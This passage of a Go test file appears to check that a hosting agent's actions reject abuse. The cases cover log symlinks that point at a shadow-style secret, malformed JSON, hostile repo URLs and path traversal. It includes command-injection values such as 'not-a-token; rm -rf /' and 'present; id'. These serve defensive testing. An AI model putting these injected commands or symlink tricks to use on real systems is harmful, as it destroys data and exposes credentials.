		t.Fatal(err)
	}
	fake := osutil.NewFakeExecutor()
	a := &LogsTail{OS: fake, BasePath: base}
	_, err := a.Execute(context.Background(), mustJSON(t, map[string]any{
		"account_slug": "demo", "domain": "example.com", "source": "build", "lines": 10, "log_path": "build.log",
	}))
	if err == nil {
		t.Fatal("build log symlinked to a file outside the account was read")
	}
	if len(fake.CallsFor("RunAs")) != 0 {
		t.Fatalf("cat ran on a symlink target: %v", fake.Calls)
	}
}

func TestAbuse_AccessLogSymlinkToSecretIsNotReadAsRoot(t *testing.T) {
	// logs/ is owned by the account user, so a compromised web app can
	// replace access.log with a symlink. The agent reads this file as root
	// (os.ReadFile), so it must refuse to follow the link out of the home.
	base, home := abuseHome(t)
	logsDir := filepath.Join(home, "logs")
	if err := os.MkdirAll(logsDir, 0o755); err != nil {
		t.Fatal(err)
	}
	secret := filepath.Join(t.TempDir(), "shadow")
	if err := os.WriteFile(secret, []byte("root:$6$hash"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(secret, filepath.Join(logsDir, "access.log")); err != nil {
		t.Fatal(err)
	}

	fake := osutil.NewFakeExecutor()
	// Make the fake behave like the real filesystem for this one path.
	fake.ReadFileData[filepath.Join(logsDir, "access.log")] = []byte("root:$6$hash")
	a := &LogsTail{OS: fake, BasePath: base}
	res, err := a.Execute(context.Background(), mustJSON(t, map[string]any{
		"account_slug": "demo", "domain": "example.com", "source": "access", "lines": 10,
	}))
	if err == nil {
		if r, ok := res.(*LogsTailResult); ok && r.Count > 0 {
			t.Fatalf("access.log symlink to a root-only file was read and returned: %v", r.Lines)
		}
	}
	if len(fake.CallsFor("ReadFile")) != 0 {
		t.Fatalf("root ReadFile ran on a symlinked access.log: %v", fake.Calls)
	}
}

func TestAbuse_LogsLinesBoundsAreEnforced(t *testing.T) {
	a := &LogsTail{OS: osutil.NewFakeExecutor()}
	base := map[string]any{"account_slug": "demo", "domain": "example.com", "source": "app", "lines": 10}
	for _, n := range []int{0, -1, 1001, 1 << 30} {
		requireRejected(t, a, with(base, "lines", n))
	}
}

// ---------------------------------------------------------------------------
// Repositories: only public https git hosts, never an internal service
// ---------------------------------------------------------------------------

func TestAbuse_RepoURLRejectsInternalAndNonHTTPSTargets(t *testing.T) {
	for _, u := range repoAttacks {
		t.Run(fmt.Sprintf("%q", u), func(t *testing.T) {
			if err := validate.RepoURL(u); err == nil {
				t.Fatalf("hostile repo URL accepted: %q", u)
			}
		})
	}
	for _, ok := range []string{
		"https://github.com/user/repo",
		"https://github.com/user/repo.git",
		"https://gitea.example.org:3000/user/repo",
	} {
		if err := validate.RepoURL(ok); err != nil {
			t.Errorf("benign repo URL rejected: %q: %v", ok, err)
		}
	}
}

// ---------------------------------------------------------------------------
// Container names, and unknown / extra parameters
// ---------------------------------------------------------------------------

func TestAbuse_ContainerNamesWithSpecialCharsAreRejected(t *testing.T) {
	for _, n := range containerNameAttacks {
		if n == "" {
			continue
		}
		t.Run(fmt.Sprintf("%q", n), func(t *testing.T) {
			if err := validate.ContainerName(n); err == nil {
				t.Fatalf("container name %q accepted", n)
			}
		})
	}
}

func TestAbuse_MalformedJSONParamsAreRejected(t *testing.T) {
	for _, c := range abuseMatrix() {
		for _, raw := range []string{``, `null`, `[]`, `"string"`, `{"account_slug":`, `{"account_slug": ["demo"]}`, `{"account_slug": {"$gt": ""}}`} {
			if err := c.action.Validate(json.RawMessage(raw)); err == nil {
				// null/[] etc. must not produce a valid action from nothing.
				t.Errorf("%s accepted malformed params %q", c.action.Name(), raw)
			}
		}
	}
}

func TestAbuse_EmptyParamsNeverPassValidation(t *testing.T) {
	for _, c := range abuseMatrix() {
		if err := c.action.Validate(json.RawMessage(`{}`)); err == nil {
			t.Errorf("%s accepted an empty parameter object", c.action.Name())
		}
	}
}

func TestAbuse_TunnelTokenMustBelongToTunnel(t *testing.T) {
	a := &CFConnectionApply{OS: osutil.NewFakeExecutor()}
	base := map[string]any{
		"account_slug": "demo", "connection_id": 1, "state": "present",
		"tunnel_id":    "11111111-2222-3333-4444-555555555555",
		"tunnel_token": "not-a-token; rm -rf /",
	}
	requireRejected(t, a, base)
	requireRejected(t, a, with(base, "state", "present; id"))
	requireRejected(t, a, with(base, "connection_id", 0))
	requireRejected(t, a, with(base, "connection_id", -5))
	requireRejected(t, a, with(base, "account_slug", "../demo"))
}
